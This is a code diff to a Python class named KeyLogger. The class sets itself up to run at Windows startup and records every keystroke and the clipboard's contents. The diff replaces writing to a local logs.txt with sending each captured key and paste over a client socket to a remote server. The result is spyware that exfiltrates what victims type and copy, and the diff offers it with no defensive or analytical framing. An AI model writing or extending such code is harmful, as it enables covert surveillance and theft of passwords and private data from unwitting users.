@@ -7,12 +7,14 @@ import winshell
 import win32com.client
 import threading
 import pyperclip
+from client import ClientSocket
 
 class KeyLogger:
     def __init__(self):
         self.user = getpass.getuser()
         self.startupDir = winshell.startup()
         self.oldPaste = ""
+        self.client = ClientSocket()
 
     def create_shortcut(self):
         if os.path.isfile("main.exe"):
@@ -38,11 +40,9 @@ class KeyLogger:
         if key == keyboard.Key.ctrl_l:
             if paste != self.oldPaste:
                 self.oldPaste = paste
-                with open("logs.txt", "a+") as f:
-                    f.write(f"{time} | Paste - {paste}\n")
+                self.client.send_message(f"{time} | Paste - {paste}\n")
         else:
-            with open("logs.txt", "a+") as f:
-                f.write(f"{time} | Key - {key}\n")
+            self.client.send_message(f"{time} | Key - {key}\n")
 
     def key_listener(self):
         with keyboard.Listener(on_press=self.on_press) as kl:
